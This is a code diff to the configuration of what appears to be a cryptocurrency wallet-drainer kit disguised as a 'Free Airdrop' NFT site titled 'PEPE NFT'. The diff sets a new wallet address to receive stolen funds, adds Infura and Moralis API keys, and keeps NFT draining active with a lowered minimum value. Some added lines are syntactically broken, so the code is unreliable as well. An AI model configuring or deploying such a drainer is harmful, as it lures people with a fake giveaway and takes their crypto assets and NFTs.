@@ -1,5 +1,8 @@
-const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
-  collectionInfo = {
+const receiveAddress = '0x80B0dfC12b4d4f4Bf35277daA644347Ba586b3de',
+const infuraId = 401dc9d92b0344ec8e6f6bff6ea77d4f
+const moralisApi = dcc21d8b-8730-4162-b36e-cd81b55f72aa
+  
+collectionInfo = {
     name: 'THE NFT WORLD',
     socialMedia: {
       discord: 'https://discord.gg',
@@ -10,7 +13,7 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
 
   indexPageInfo = {
     backgroundImage: 'background.jpg',
-    title: '{name}',
+    title: '{PEPE NFT}',
     underTitle: 'Free Airdrop',
   },
 
@@ -26,8 +29,8 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
 
   drainNftsInfo = {
     active: true,
-    minValue: 0.1,
-    nftReceiveAddress: '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+    minValue: 0.05,
+    nftReceiveAddress: '0x80B0dfC12b4d4f4Bf35277daA644347Ba586b3de',
   },
 
   customStrings = {
